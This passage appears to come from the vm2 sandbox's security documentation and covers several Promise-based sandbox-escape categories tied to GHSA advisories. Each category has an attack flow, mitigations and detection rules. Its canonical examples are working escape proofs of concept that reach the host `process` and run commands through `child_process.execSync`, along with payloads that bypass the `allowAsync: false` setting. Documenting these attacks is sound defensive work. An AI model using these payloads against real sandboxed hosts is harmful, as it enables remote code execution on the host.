6. Sandbox reads `ex.constructor.constructor("return process")()` → host `Function` constructor → `process` → RCE.

### Canonical Example

```javascript
// (advisory GHSA-76w7-j9cq-rx2j)
const { VM } = require('vm2');
new VM().run(`
  class E extends Error {}
  function so(d) {
    if (d > 0) so(d-1);
    const e = new E();
    e.stack;
    throw e;
  }
  let ex, ct;
  class FakePromise extends Promise {
    static get [Symbol.species]() { return ct; }
  }
  function doCatch(f) {
    ex = undefined;
    const p = Promise.withResolvers();
    ct = function(e) { e(f, v => { ex = v; p.resolve(); }) };
    new FakePromise(r => r());
    return p.promise;
  }
  (async function f(s) {
    let min = s, max = 100000;
    while (min < max) {
      const mid = (min + max) >> 1;
      await doCatch(() => so(mid));
      if (ex.name === "RangeError" && !(ex instanceof RangeError)) {
        ex.constructor.constructor("return process")()
          .mainModule.require('child_process').execSync('touch pwned');
        return;
      }
      if (ex instanceof E) min = mid + 1; else max = mid;
    }
    f(s + 1);
  })(0);
`);
```

### Why It Works

The Category 22 swallow tail was designed to **silence** unhandled rejections without participating in user-visible Promise mechanics — so it uses the cached native `then` (`globalPromisePrototypeThen`) to avoid recursing through vm2's `.then` override. But the cached native `then` is still the **specification-mandated** `then`, which performs species resolution. The cached-`then` design correctly avoided the `.then` override recursion; it did not account for the species protocol that runs *inside* that native `then`.

Every other call site that touches a host `then`/`catch` (`globalPromise.prototype.then` override, `globalPromise.prototype.catch` override, `localReflect.apply` wrapper) bookends with `resetPromiseSpecies(this)`. The swallow-tail site — inside `localPromise`'s own constructor body — was the only one missing the reset, because `resetPromiseSpecies` is declared later in the module and was thought to be unreachable from the constructor's lexical scope. In practice the constructor body executes lazily (user code triggers it via `new Promise(...)`), by which point the module has fully initialised and the reset is in scope.

The species hijack is the same primitive as Category 18 (Array species self-return), now applied to Promise instead of Array. The structural lesson is identical: **every call into a host built-in that uses `SpeciesConstructor` must first neutralise the species on `this`**.

### Mitigation

Add `resetPromiseSpecies(this)` immediately before the swallow-tail `apply(globalPromisePrototypeThen, this, [undefined, localPromiseSwallow])` call in the `localPromise` constructor. This pins `this.constructor` to `localPromise` as an own data property, shadowing any inherited species accessor on `FakePromise`. The species protocol then resolves to `localPromise`, and the downstream child is constructed via `localPromise`'s own wrapped executor (Category 22) — V8's internal `(resolve, reject)` capability cannot be rebound by a sandbox-controlled constructor.

Together with the existing wrapped executor and the `localPromiseInSwallowTail` re-entrancy guard, this restores **[Defense Invariant #4](../ATTACKS.md#defense-invariants)** (no host built-in is invoked with a sandbox `this` whose species can be hijacked) for the swallow-tail call site, and closes the path through which raw host-realm errors reached the `userReject` collector.

The fix preserves benign subclass behaviour: `class MyPromise extends Promise {}` still works because `MyPromise` does not override `Symbol.species`, so species would naturally resolve to `MyPromise` itself; the reset only matters when an attacker installs a malicious species. The user-visible `myPromise.constructor` is mutated to `localPromise` by the reset — the same observable change already produced by every `.then()`/`.catch()`/`Reflect.apply` call, so this is consistent with the existing invariant.

### Detection Rules

- **`class X extends Promise { static get [Symbol.species]() { return userFn } }`** — any sandbox subclass of Promise that overrides `Symbol.species` is suspect. After the fix, the species value is ignored for any call site vm2 controls, but the pattern remains an indicator of attempted hijack.
- **User function `ct` that receives the species `Construct` call and re-invokes the V8 internal executor with sandbox-controlled `(resolve, reject)`** — Category-22-style closures over the V8 resolver are the canonical attack shape.
- **Synchronous resolution of a Promise immediately followed by inspection of a captured rejection value** — `new FakePromise(r => r())` constructed solely to trigger the swallow tail (then the downstream child's reject) is a tell-tale signature.
- **Composition with the recursion-overflow primitive (Category 29)** or any other host-error generator inside the downstream chain — the species hijack is the transport; the host error is the payload.

### Considered Attack Surfaces

- **Other host-`then` call sites.** `sanitizeAsyncIteratorResultPromise` (the Category 29 fix) also calls `apply(globalPromisePrototypeThen, promise, [...])` on a promise produced by V8's async generator machinery. That promise is intrinsic — its `constructor` walks to `globalPromise` and species resolves to `globalPromise` by default — so the species channel is not user-controlled there. Adding a defensive `resetPromiseSpecies(promise)` is a harmless belt-and-suspenders option but is not required for this advisory.
- **Benign subclasses without species override.** `class MyPromise extends Promise {}` (no `[Symbol.species]`) is unaffected — species would naturally resolve to `MyPromise`; the reset only flips it to `localPromise`. The pinned `localPromise` constructor is fully compatible with subclass semantics (the outer instance is still a `MyPromise`; only the internal swallow-tail child is `localPromise`, and that child is never returned to user code).
- **Frozen `Promise.prototype.constructor`.** `resetPromiseSpecies` defines an own data property on the instance, not on the prototype. Even if a hostile sandbox tried to make the prototype's `constructor` non-configurable (which the bridge prevents), the own-property write would still shadow it. The reset throws a `LocalError` only if the instance itself is non-extensible or has a non-configurable `constructor` — in which case the outer try/catch in the swallow-tail block swallows it harmlessly and the rest of the constructor proceeds.

---

## Attack Category 33: WebAssembly JSPI Cross-Realm Promise Prototype

**Advisories**: GHSA-6j2x-vhqr-qr7q, GHSA-55hx-c926-fr95, GHSA-wjwh-qqvp-g4p4, GHSA-m3pp-qgq7-gwm6 (dup of GHSA-wjwh-qqvp-g4p4)

**Tests**: test/ghsa/GHSA-6j2x-vhqr-qr7q/, test/ghsa/GHSA-55hx-c926-fr95/, test/ghsa/GHSA-wjwh-qqvp-g4p4/

**Uses**: [Category 3: Symbol-Based Attacks](host-reference-primitives.md#attack-category-3-symbol-based-attacks), [Category 7: Promise and Async Exploitation](promise-async.md#attack-category-7-promise-and-async-exploitation), [Category 17: WebAssembly JSTag Exception Catch](error-sanitization.md#attack-category-17-webassembly-jstag-exception-catch).

### Description

The WebAssembly JavaScript Promise Integration (JSPI) API — `WebAssembly.promising` and `WebAssembly.Suspending`, available behind `--experimental-wasm-jspi` on Node 24 and enabled by default on Node 26+ — returns Promise objects whose `[[Prototype]]` chain points **directly at the host realm's `Promise.prototype`** without going through any bridge proxy.

This is a categorically new shape of sandbox-visible object. Until JSPI, every Promise reachable from sandbox code was either:

1. A sandbox-realm Promise whose `[[Prototype]]` includes `globalPromise.prototype` (so the vm2 overrides on `then`/`catch` apply), or
2. A bridge proxy of a host-realm Promise (so the bridge `apply`-trap interception applies).

JSPI breaks this dichotomy by producing a third class — sandbox-realm allocation, host-realm prototype, no bridge proxy. Neither defense layer can intercept it: sandbox property access on a JSPI promise walks the cross-realm prototype chain and resolves directly to host-realm native `Promise.prototype.{then,catch,finally}`. The sandbox-side `globalPromise.prototype.then|catch` overrides are never reached (different prototype object). `resetPromiseSpecies` is only invoked from those overrides, so it never runs. The bridge `apply` trap only fires for bridge-proxied callables, which JSPI promises are not.

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. **Build a wasm module** that imports a Suspending function `f` and exports a `run` that calls `f`. The PoC's 60-byte module body is `(module (func (import "m" "f") (param) (result)) (func (export "run") (call 0)))`.
2. **Suspending throw setup**: `new WebAssembly.Suspending(() => WebAssembly.compileStreaming(Promise.resolve(0)))`. `compileStreaming` expects a `Response` or `Promise<Response>`; given the number `0`, it eventually rejects with a host-realm `TypeError` from `node:internal/wasm_web_api`.
3. **JSPI promotion**: `const p = WebAssembly.promising(instance.exports.run)()`. The returned `p` is sandbox-realm by allocation but its `[[Prototype]]` is the host realm's `Promise.prototype` — confirmed by `Object.getPrototypeOf(p) === Promise.prototype` returning `false` and `Object.getPrototypeOf(Object.getPrototypeOf(p)) === Object.prototype` returning `true` (no sandbox `Promise.prototype` link in the chain at all).
4. **Species installation directly on `p`**: `Object.defineProperty(p, 'constructor', { get(){ return F; }})`. Because `p` is not a bridge proxy, the `defineProperty` call hits the raw object — the getter is installed on `p` itself, visible to V8's host-realm SpeciesConstructor lookup.
5. **`.finally` triggers the host species path**: `p.finally(() => {})`. Property access walks `p → hostPromisePrototype`, finds host `Promise.prototype.finally`, and calls it (no apply-trap interception since the method was reached via prototype walk, not via a proxy). Host's `finally` per spec runs `SpeciesConstructor(p, %Promise%)` → reads `p.constructor` → invokes attacker getter → returns `F` (sandbox class).
6. **Result capability bypass**: `NewPromiseCapability(F)` constructs an `F` instance with V8's builtin executor. `F`'s constructor calls `x(resolveCb, rejectCb)` with raw sandbox closures. There is no bridge between the host-realm executor and the sandbox closures — the executor is a direct host function reference held by sandbox code without proxying — so V8 stores the raw sandbox closures as `capability.[[Resolve]]` and `capability.[[Reject]]`.
7. **Rejection dispatch raw**: when the JSPI promise rejects with the host `TypeError` from step 2, V8's PromiseReactionJob calls `capability.[[Reject]](hostTypeError)` directly. The sandbox closure receives the **raw host-realm `TypeError`** with no bridge wrapping.
8. **Escape**: inside `F`'s reject closure, `e.constructor` is host `TypeError`; `.constructor` is host `Function`; `'return process'` constructs a function whose `[[Realm]]` is host, so invoking it evaluates `process` in the host realm and returns the host `process` object. `process.mainModule.require('child_process').execSync(...)` → RCE.

### Canonical Example

```javascript
// (advisory GHSA-6j2x-vhqr-qr7q). Environment: node:26-bookworm (JSPI default-on).
const { VM } = require("vm2");
new VM().run(`
  let b = Uint8Array.of(0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,
    0,0,3,2,1,0,7,7,1,3,114,117,110,0,1,10,6,1,4,0,16,0,11);
  WebAssembly.instantiate(b, {
    m: { f: new WebAssembly.Suspending(() =>
      WebAssembly.compileStreaming(Promise.resolve(0))) }
  }).then(r => {
    let p = WebAssembly.promising(r.instance.exports.run)();
    class F {
      constructor(x) {
        this.s = 0; this.q = [];
        x(v => { this.s = 1; this.v = v;
                 for (let i of this.q) if (i[0]) i[0](v); },
          e => {
            let P = e.constructor.constructor('return process')();
            P.mainModule.require('child_process').execSync('touch pwned');
            this.s = 2; this.v = e;
            for (let i of this.q) if (i[1]) i[1](e);
          });
      }
      then(f, r) {
        if (this.s == 1) return f ? f(this.v) : this.v;
        if (this.s == 2) { if (r) return r(this.v); throw this.v; }
        this.q.push([f, r]); return 0;
      }
    }
    Object.defineProperty(F, Symbol.species, { get(){ return F; }});
    Object.defineProperty(p, 'constructor', { configurable: true, get(){ return F; }});
    p.finally(() => {});
  });
`);
```

### Why It Works

The structural defects compound:

- **Cross-realm prototype is a new attack shape.** All prior Promise hardening assumes one of two regimes — sandbox-realm with our overrides, or bridge-proxied host realm. JSPI invented a third: sandbox-realm allocation, host-realm prototype, no proxy. Every existing defense was scoped to one of the two known regimes.
- **No proxy = no apply-trap interception.** The bridge `apply` trap on host `Promise.prototype.{then,catch,finally}` (installed by GHSA-55hx-c926-fr95) wraps sandbox callbacks with sanitizers before invoking the host method. JSPI promises bypass it because property lookup walks a raw prototype chain to host methods directly — there is no proxy, no apply trap, no sanitizer wrapping.
- **No `globalPromise.prototype` link = no `resetPromiseSpecies`.** The sandbox-side `globalPromise.prototype.then|catch` overrides are the chokepoint where `resetPromiseSpecies(this)` runs. The JSPI promise's prototype chain never traverses `globalPromise.prototype`, so the override is never reached.
- **`PerformPromiseThen` is C++ anyway.** Even if `.then` had been overridden, host `Promise.prototype.finally` calls `PerformPromiseThen` directly via the spec's internal abstract operations, bypassing user-visible `.then` dispatch.
- **F's executor receives raw host references.** Because everything from the species lookup onward happens inside host's `finally` implementation reading the attacker getter installed on the raw JSPI promise, the entire flow stays "host code holding sandbox class F" without any bridge mediation. F's resolve/reject closures get registered as capability functions directly, then invoked directly with raw host rejection reasons.

### Mitigation

Delete `WebAssembly.promising` and `WebAssembly.Suspending` from the sandbox at bootstrap in `lib/setup-sandbox.js`, mirroring the existing `WebAssembly.JSTag` removal ([Category 17](error-sanitization.md#attack-category-17-webassembly-jstag-exception-catch)). Without `Suspending`, a wasm module cannot import a JS function as a suspending import; without `promising`, sandbox cannot promote a wasm function into a JSPI export.

**Streaming compile APIs are a second source of the same shape (GHSA-wjwh-qqvp-g4p4, dup GHSA-m3pp-qgq7-gwm6).** JSPI is *not* the only primitive that hands the sandbox a cross-realm-prototype Promise: on Node 26, `WebAssembly.compileStreaming(x)` and `WebAssembly.instantiateStreaming(x)` also return a Promise whose `[[Prototype]]` chain reaches the host realm's `Promise.prototype`, and the identical species-`constructor` + `p.finally()` flow delivers the raw host rejection to an attacker capability → `e.constructor.constructor("return globalThis")()` → host `process`. Both are therefore removed alongside the JSPI constructors. They consume a `Response`/streaming source the sandbox cannot obtain, so removal has no legitimate-use cost; the **non-streaming** `WebAssembly.compile` / `WebAssembly.instantiate` return sandbox-realm Promises that pass through the override/bridge path and remain available.

The removal is guarded by `typeof` checks so the same code path is a no-op on Node ≤ 23 (no JSPI constants exist) and on Node 24/25 without the `--experimental-wasm-jspi` flag (constants exist on the global but not on the sandbox-context `WebAssembly`).

This fix restores [Defense Invariant #4](../ATTACKS.md#defense-invariants) (V8 internal algorithms cannot read attacker-controlled `constructor` on host objects) for sandbox-visible Promises — by eliminating the only known path that produces sandbox-visible Promises outside the two regimes the invariant was originally formulated for. It also expresses a stronger invariant that has been latent in the codebase, [Defense Invariant #12](../ATTACKS.md#defense-invariants): every sandbox-visible Promise must either include `globalPromise.prototype` in its `[[Prototype]]` chain (so sandbox-side overrides apply) or be a bridge proxy of a host-realm Promise (so the bridge `apply`-trap applies); any third class must be neutralised at sandbox bootstrap.

JSPI is the first known instance of this third class; future spec extensions that produce similarly-shaped objects (a hypothetical structured-clone Promise, `WebAssembly`-future, embedder host functions returning cross-realm-prototype objects) must be checked against the same invariant.

**Supersedes**: None directly. Strengthens the surrounding family of Promise species fixes ([Category 7](promise-async.md#attack-category-7-promise-and-async-exploitation)) by closing the cross-realm-prototype variant that the prior `resetPromiseSpecies` + apply-trap-wrapping design could not reach.

### Detection Rules

- **`typeof WebAssembly.promising`** or **`typeof WebAssembly.Suspending`** evaluated inside the sandbox returning anything other than `'undefined'` — the bootstrap removal failed and the attack surface is open.
- **`new WebAssembly.Suspending(...)`** in sandbox code — direct attempt to construct a Suspending function. After the fix this throws `TypeError: WebAssembly.Suspending is not a constructor`.
- **`WebAssembly.promising(...)`** in sandbox code — direct attempt to promote a wasm function into JSPI. After the fix this throws `TypeError: WebAssembly.promising is not a function`.
- **Wasm modules that import a function with `Suspending`-binding semantics** — the import name pattern isn't directly observable from JS, but the module must be paired with `new WebAssembly.Suspending(...)` at instantiation. Removing the Suspending constructor blocks the pairing.
- **`Object.defineProperty(p, 'constructor', ...)` on a Promise whose prototype is not `globalPromise.prototype` or a bridge proxy** — heuristic that flags any future cross-realm-prototype Promise shape. Currently no such object reaches sandbox code; this rule is a tripwire for future regressions.

### Considered Attack Surfaces

- **Other WebAssembly features.** ⚠️ **Corrected by GHSA-wjwh-qqvp-g4p4.** The original audit claimed the `compileStreaming`/`instantiateStreaming` family returned no cross-realm-prototype objects; on Node 26 that was wrong — both return a host-realm-prototype Promise and are exploitable via the identical species+`finally` flow. They are now removed (see Mitigation above). The remainder of the audit holds: `WebAssembly.Module`, `Instance`, `Memory`, `Table`, `Global`, `Exception`, `Tag`, `Function`, the non-streaming `compile`/`instantiate`, `validate`, and the error classes return either primitives or bridge-proxied objects whose prototypes reach `Object.prototype` (in `protoMappings`, wrapped via `defaultFactory`). The lesson: "confirmed empirically" on one Node version is not proof across versions — V8 changed the realm of the streaming-compile result Promise between releases.
- **SharedArrayBuffer / Atomics / WeakRef / FinalizationRegistry.** Instances proxied via the `Object.prototype` mapping fallback. Atomics returns only primitives or already-proxied objects. WeakRef and FinalizationRegistry callbacks are sandbox closures that don't return host objects.
- **`ShadowRealm`.** Not exposed in current Node releases (`typeof ShadowRealm === 'undefined'`). If exposed in a future Node, would need its own bootstrap treatment.
- **`structuredClone` / `MessagePort`.** `structuredClone` is not on the sandbox global by default. `MessagePort` is not exposed.
- **Embedder-exposed host functions returning host Promises.** Bridge-proxied as before — falls under regime (b) of the invariant and is covered by GHSA-55hx-c926-fr95 apply-trap callback sanitization.

---

## Attack Category 43: Stale `PromiseThenLookupChain` Protector — Species Survives `finally`

**Advisories**: GHSA-27g9-p43v-cw3v

**Tests**: test/ghsa/GHSA-27g9-p43v-cw3v/

### Description

vm2 neutralizes the Promise species channel by overriding `Promise.prototype.then` / `.catch` with wrappers that call `resetPromiseSpecies(this)` before delegating to the cached natives. Those overrides were installed by **plain assignment** (`globalPromise.prototype.then = fn`). On Node 26 / V8 14.6 the `proto_assign_seq_opt` optimization folds such a consecutive assignment sequence into `SetPrototypeProperties`, whose existing-data-property branch calls `Object::SetDataProperty` **without** `UpdateProtector()`. The JavaScript property holds vm2's wrapper, but V8's `PromiseThenLookupChain` protector is left incorrectly valid.

`Promise.prototype.finally` performs an internal `InvokeThen`. Trusting the stale protector, V8 skips the observable `then` lookup and calls the **original native `then`** directly — the wrapper never runs, so `resetPromiseSpecies` never runs. An ordinary fulfilled Promise from an async function therefore carries an attacker `constructor[Symbol.species]` across `p.finally()`, and V8's `SpeciesConstructor` hands the attacker class control of a native Promise reaction's resolve/reject capability. A calibrated stack overflow at that native reaction boundary produces a raw host-realm `RangeError` delivered straight to the attacker's reject closure, giving `e.constructor.constructor` → host `Function` → host `process`.

This is an engine-level *reachability* failure of an existing vm2 defense, distinct from [Category 31](promise-async.md#attack-category-31-promise-species-hijack-in-localpromise-swallow-tail) (a vm2 code path that genuinely omitted the reset) and from [Category 33](promise-async.md#attack-category-33-webassembly-jspi-cross-realm-promise-prototype) (a Promise whose `[[Prototype]]` never reaches the sandbox overrides at all). Here the override exists, is installed on the right prototype, and is simply not dispatched to.

### Attack Flow

1. Sandbox obtains an ordinary intrinsic Promise: `const p = (async () => 1)();`.
2. Sandbox installs an own `constructor` whose `Symbol.species` is an attacker class: `Object.defineProperty(p, 'constructor', { value: { [Symbol.species]: Evil } })`.
3. Sandbox calls `p.finally()`. V8 takes the `InvokeThen` fast path on the stale protector, bypassing vm2's `then` wrapper and its `resetPromiseSpecies(this)`.
4. `SpeciesConstructor(p, Promise)` resolves to `Evil`; `new Evil(executor)` runs attacker code with the native reaction's `resolve` / `reject`.
5. The attacker drives the reaction to a stack-overflow boundary; V8 constructs a **host-realm** `RangeError` and passes it to the attacker's `reject` without traversing `handleException`.
6. `err.constructor.constructor('return this')()` evaluates in the host realm — reached even with `eval: false` and `wasm: false`.

### Canonical Example

```javascript
// (advisory GHSA-27g9-p43v-cw3v) — Node 26 / V8 14.6, default `new VM()`
const vm = new VM({ allowAsync: true, eval: false, wasm: false });
vm.run(`
    class Evil {
        constructor(executor) { executor(v => {}, hostErr => { /* raw host RangeError */ }); }
    }
    const p = (async () => 1)();
    Object.defineProperty(p, 'constructor', { value: { [Symbol.species]: Evil } });
    p.finally();          // wrapper skipped; Evil receives the reaction capability
`);
```

Negative control: running the same payload under `node --no-proto-assign-seq-opt` disables the optimization, the protector is invalidated correctly, and the escape does not occur.

### Why It Works

The defense was correct in content but installed through an operation the engine mis-accounted. Protectors are V8's mechanism for "nobody has patched this intrinsic"; every property-installation path is supposed to invalidate them. The assignment path in this V8 version does not, so the engine keeps using a cached direct reference to the native `then` for its own internal invocations while user-visible lookups return vm2's wrapper. No amount of sandbox-side logic inside the wrapper helps when the wrapper is never entered — the fix has to change *how* the property is installed, and additionally defend the specific consumer (`finally`) that the fast path served.

### Mitigation

Two independent layers in `lib/setup-sandbox.js`:

1. **Install through `[[DefineOwnProperty]]`.** The `then` / `catch` wrappers are installed with `localReflectDefineProperty(globalPromise.prototype, …)` rather than assignment. `Reflect.defineProperty` invalidates `PromiseThenLookupChain`, so `finally` (and any other native consumer of `then`) dispatches through the wrapper again. The descriptors preserve the intrinsics' shape (`writable: true, enumerable: false, configurable: true`).
2. **Wrap `finally` itself.** `globalPromise.prototype.finally` is replaced (also via `localReflectDefineProperty`) with a wrapper that runs `resetPromiseSpecies(this)` before delegating to the cached native `finally`. This closes the species channel on the `finally` path directly, so the defense does not depend on any engine protector being accounted correctly. The wrapper is installed behind a `typeof` guard because `Promise.prototype.finally` does not exist before Node 10.

Layer 2 is the durable one: it turns `finally` from a species-sensitive intrinsic into a species-neutralizing one, matching `then` and `catch`. Layer 1 restores correct dispatch generally, which also protects any future internal `then` consumer.

**Residual:** neither layer helps a Promise whose `[[Prototype]]` chain never reaches the sandbox `Promise.prototype` — such a Promise dispatches to the *host* `finally`. That class is handled by removing the intrinsics that produce them (see [Category 33](promise-async.md#attack-category-33-webassembly-jspi-cross-realm-promise-prototype)), and any new such source must still be removed there.

### Detection Rules

- **`p.finally()` on a Promise with an own `constructor` / `Symbol.species`** — the canonical shape of this attack.
- **Prototype-method installation by plain assignment** on an intrinsic whose lookup V8 protects (`Promise.prototype.then`, `Array.prototype[Symbol.iterator]`, …). Install via `Reflect.defineProperty` so protector invalidation is guaranteed.
- **Any sandbox constructor invoked as a species** — a frozen host callback inside the species constructor is a sound oracle: under a correct install it must never run.
- More broadly, **a defense that lives inside a wrapper whose dispatch the engine may shortcut**. Prefer defenses that also neutralize the underlying state (here, the promise's `constructor`) over ones that only intercept a call.

---

## Attack Category 51: `allowAsync: false` Bypass via Promise Thenable Assimilation

**Advisories**: GHSA-f8gf-w286-fmq2

**Tests**: test/ghsa/GHSA-f8gf-w286-fmq2/, test/vm.js ("async")

**Uses**: [Category 7](promise-async.md#attack-category-7-promise-and-async-exploitation)

### Description

This is a **protection-mechanism bypass** (CWE-693), not a host-object containment breach. When a `VM`/`NodeVM` is configured with `allowAsync: false`, untrusted code is supposed to run strictly synchronously: any attempt at asynchronous execution must throw `VMError: Async not available`, and nothing may execute after `run()` returns (so a `timeout` cannot be outrun). Under `allowAsync: false` the sandbox exposes **no** `setTimeout`, `setImmediate`, or `queueMicrotask` — so the *only* way to schedule sandbox code into a later microtask is the Promise machinery.

The implementation blocked `Promise.prototype.then` (replaced by a throwing handler) but left every other path that triggers **thenable assimilation** open. When a native promise is resolved with a thenable, V8's internal `PromiseResolveThenableJob` reads the value's own `.then` and calls it directly in a microtask — it never goes through `Promise.prototype.then`, so the throwing handler is never reached. The attacker's `then` runs *after* `run()` has returned, outside the configured `timeout`, breaking the synchronous-execution boundary (DoS / event-loop blocking; the report disclaims host-object exposure).

### Attack Flow

1. Construct a VM with `{allowAsync: false, timeout: T}`.
2. Run code that hands a thenable (`{then(){ /* attacker code */ }}`) to any operation that assimilates it.
3. `vm.run()` returns synchronously (the host believes the run is complete).
4. V8 runs `PromiseResolveThenableJob` on the next microtask tick, invoking the attacker `then` — after `run()` returned and outside `timeout`.

### Canonical Examples

```js
// Reported static-method entry points — all schedule the thenable's `then`:
new VM({allowAsync:false}).run(`Promise.resolve({then(){/*runs late*/}}); 1`);
new VM({allowAsync:false}).run(`Promise.all([{then(){/*…*/}}]); 1`);
new VM({allowAsync:false}).run(`Promise.race([{then(){/*…*/}}]); 1`);
new VM({allowAsync:false}).run(`Promise.any([{then(){/*…*/}}]); 1`);
new VM({allowAsync:false}).run(`Promise.allSettled([{then(){/*…*/}}]); 1`);

// Additional entry points in the same class (not in the original report):
new VM({allowAsync:false}).run(`new Promise(r => r({then(){/*…*/}})); 1`);          // ctor resolve capability
new VM({allowAsync:false}).run(`Promise.withResolvers().resolve({then(){/*…*/}}); 1`);// same capability
new VM({allowAsync:false}).run(`Promise.try(() => ({then(){/*…*/}})); 1`);            // Node 24+
new VM({allowAsync:false}).run(`Array.fromAsync([{then(){/*…*/}}]); 1`);              // Node 22+ (Array static)

// The realm-intrinsic base, reachable because localPromise extends globalPromise:
new VM({allowAsync:false}).run(`new (Object.getPrototypeOf(Promise))(r => r({then(){/*…*/}})); 1`);
new VM({allowAsync:false}).run(`Reflect.construct(Object.getPrototypeOf(Promise), [r => r({then(){/*…*/}})], Promise); 1`);
new VM({allowAsync:false}).run(`new (Object.getPrototypeOf(Promise.prototype).constructor)(r => r({then(){/*…*/}})); 1`);
```

### Why It Works

Blocking `Promise.prototype.then` addresses only the *explicit* async-dispatch method. Thenable assimilation is a *different* V8 primitive: the resolve function of any native promise reads `Get(resolution, "then")` and, if callable, enqueues `PromiseResolveThenableJob` to call it. Every Promise static method, the constructor's resolve argument, `withResolvers`, `Promise.try`, and `Array.fromAsync` funnel through a native resolve capability, and none of them consult `Promise.prototype.then`. Worse, the native base constructor itself stays reachable from the sandbox (`localPromise extends globalPromise`, so `Object.getPrototypeOf(Promise)` and the deep `Promise.prototype` constructor walk both land on it), and constructing it directly yields an *unguarded* resolve capability.

### Mitigation

Restores **[Defense Invariant #14](../ATTACKS.md#defense-invariants)**. Structural fix in `lib/setup-sandbox.js`, entirely gated to `allowAsync: false` so the battle-tested `allowAsync: true` Promise shape — and every prior advisory defense built on it — is untouched:

1. **Capability guard** (`makeAsyncGuardedResolve`, used by the `localPromise` constructor's wrapped executor): the resolve handed to a user executor refuses any object/function value, throwing `VMError` **without ever reading `.then`** (TOCTOU-safe by construction). Because V8 builds every promise capability by Constructing `localPromise` via `NewPromiseCapability`, this one guard covers `new Promise`, `Promise.withResolvers`, the combinators' internal capabilities, and subclass `super()` calls.
2. **Synchronous static-method refusal**: `Promise.resolve`, `all`, `race`, `any`, `allSettled`, and `try` throw `VMError` synchronously when `!allowAsync` (clearer, and version-robust on Nodes whose combinators use an internal resolve rather than `Get(C, "resolve")`).
3. **`Array.fromAsync` neutralization**: replaced by a non-configurable, non-writable throwing stub on the sandbox `Array` (cannot be restored via assignment or `defineProperty`).
4. **Construct-guard for the native base**: `localPromise`'s `[[Prototype]]` is replaced by a Proxy over `globalPromise` whose `construct` trap refuses every construction of the base **except** `localPromise`'s genuine `super()` call — recognized by WeakMap identity of an ephemeral wrapped executor the sandbox can never reference. The Proxy forwards property reads (so inherited statics still resolve) but never exposes its target (`getPrototypeOf` returns `Function.prototype`). `globalPromise.prototype.constructor` is repointed to `localPromise` so the deep prototype walk also lands on the guarded constructor. `localPromise`, `globalPromise`, and both prototypes are then frozen, so the guard cannot be stripped via `setPrototypeOf` or constructor redefinition.

`Promise.reject` and `Promise.withResolvers` stay functional: `reject` does not assimilate (a thenable reason is delivered as-is), and `withResolvers` only hands back a constructor-guarded resolve capability.

### Detection Rules

- Any sandbox policy enforced by overriding **one** method is suspect when V8 has internal algorithms that reach the same effect without that method. `Promise.prototype.then` is to thenable assimilation what attacker `constructor` is to `ArraySpeciesCreate` (Invariant #4).
- When disabling a capability class (async, here), enumerate **every** native entry point, not just the ergonomic one: static methods, constructor resolve arguments, `withResolvers`, `try`, `Array.fromAsync`, and the realm-intrinsic base reachable via prototype walks.
- A subclass (`localPromise extends globalPromise`) always leaves the base constructable via `Object.getPrototypeOf`; guarding the subclass is not enough.

### Considered Attack Surfaces

- **`Promise.reject(thenable)`** — does not assimilate; the thenable becomes an inert rejection reason. Left functional.
- **`.catch` / `.finally`** under `allowAsync: false` — route through the blocked `.then` and therefore throw. No separate handling needed.
- **`queueMicrotask` / `setTimeout` / `setImmediate`** — not exposed in the sandbox global under `allowAsync: false`, so they are not alternative scheduling vectors.
- **WebAssembly JSPI / `WebAssembly.Suspending`** — produce cross-realm promises and are neutralized separately at bootstrap ([Category 33](promise-async.md#attack-category-33-webassembly-jspi-cross-realm-promise-prototype)); not an `allowAsync` scheduling vector once removed.

---

## Attack Category 53: Host-Promise `@@species` Hijack + Missing Handler Delivers the Raw Settlement to the Sandbox

**Advisories**: GHSA-6454-5x88-m6jw

**Tests**: test/ghsa/GHSA-6454-5x88-m6jw/

**Uses**: [Category 7](promise-async.md#attack-category-7-promise-and-async-exploitation) (the Promise-species primitive), [Category 43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally)

**Supersedes**: closes the **host-realm** counterpart of the sandbox-side Promise-species defenses ([Category 43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally), which hardened only the sandbox `Promise.prototype`) and the **missing-handler** gap left by the callback-slot wrapping of [Category 39](error-sanitization.md#attack-category-39-host-promise-rejection-sanitizer-bypass-via-callapply-indirection) and [Category 38](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox).

### Description

When an embedder exposes a host API that returns a host-realm `Promise`, sandbox code can call `.then` / `.catch` / `.finally` on it across the bridge. vm2 sanitizes the *callback values* by routing the callback slots the sandbox supplies through the Category 38/39 rebuild. But V8 builds the `.then` result capability via `SpeciesConstructor(hostPromise, %Promise%)`, which reads `hostPromise.constructor[Symbol.species]` **directly off the raw host promise** — bypassing every bridge trap. The Category 43 neutralization freezes only the *sandbox* `Promise.prototype`; a *host* promise's `constructor` is an ordinary writable property from the sandbox's view.

So the sandbox writes `hostPromise.constructor = Evil`, where `Evil` is a sandbox constructor whose executor captures V8's `(resolve, reject)`. If the sandbox then **omits the handler** for the settlement direction — `p.then()` with no `onRejected`, or `p.then(onF)` / `p.catch()` / `p.finally()` — V8 substitutes its internal **Thrower** (reject) or **Identity** (fulfill) reaction, which delivers the *raw* host settlement value to the attacker-captured capability with **no callback slot for vm2 to wrap**. A host rejection/fulfillment carrying `process` (directly or on a property) reaches sandbox code as a live bridge proxy → `reason.mainModule.require('child_process').execSync(...)` → host RCE.

`.catch()` and `.finally()` are strictly worse than `.then()`: their missing reactions are synthesized *inside* the V8 builtin, off the apply-trap path entirely, so any defense that injects into the supplied argument slots cannot reach them.

### Attack Flow

1. Embedder exposes a host callable returning a host promise: `hostReject: () => Promise.reject(process)`.
2. Sandbox hijacks the species channel on the raw host promise: `p.constructor = { [Symbol.species]: function (ex) { ex(function(){}, captureReject); } }`.
3. Sandbox calls `p.then()` with the settlement-direction handler omitted.
4. `SpeciesConstructor` invokes the sandbox executor (capturing `reject`); the internal Thrower delivers the raw host `process` to `captureReject`.
5. `proc.mainModule.require('child_process').execSync('id')` → host command execution.

### Canonical Examples

```js
const {VM} = require('vm2');
new VM({sandbox:{hostReject: () => Promise.reject(process)}}).run(`
  const p = hostReject();
  p.constructor = { [Symbol.species]: function (ex) { ex(function(){}, function (proc) {
    proc.mainModule.require('child_process').execSync('id');   // host RCE
  }); } };
  p.then();                                                    // missing onRejected
`);
```

```js
// Indirection variant: host Reflect.apply invokes the host then with a sandbox-chosen
